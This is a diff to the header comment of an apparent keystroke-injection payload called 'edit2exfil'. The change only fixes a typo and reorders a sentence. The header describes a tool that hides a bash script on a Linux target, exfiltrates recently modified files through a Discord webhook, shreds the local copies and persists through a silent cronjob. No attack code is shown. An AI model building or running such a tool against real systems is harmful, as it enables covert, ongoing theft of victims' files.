@@ -2,7 +2,7 @@ REM ============================================================================
 REM TITLE: edit2exfil
 REM AUTHOR: OSINTI4L (https://github.com/OSINTI4L)
 REM TARGET OS: Linux (tested on Kali Linux Release 2025-W19)
-REM DESCRIPTION: (See README.md for full description) - edit2exfil builds a hidden bash script (.e2e.sh) in the /home directory that searches for files (see README.md) that have been modified in the last 24 hours. If found, the files are tarballed and exfiltrated via Discord webhook. The tarball is then shredded locally to obfuscate. The script is embedded as a cronjob, running every 24 hours at 10:00 AM (this can be adjusted in like 53); allowing for persistent exfiltration of files as they are updated. The script is ran by cronjob silently in the background.
+REM DESCRIPTION: (See README.md for full description) - edit2exfil builds a hidden bash script (.e2e.sh) in the /home directory that searches for files (see README.md) that have been modified in the last 24 hours. If found, the files are tarballed and exfiltrated via Discord webhook. The tarball is then shredded locally to obfuscate. The script is embedded as a cronjob, running silently in the background, every 24 hours at 10:00 AM (this can be adjusted in line 53); allowing for persistent exfiltration of files as they are updated.
 REM REQUIREMENTS: Place Discord webhook in the #WEBHOOK_URL constant on line 10 | Place the USER of the target system in the #USER constant on line 11.
 REM ==========================================================================================
 
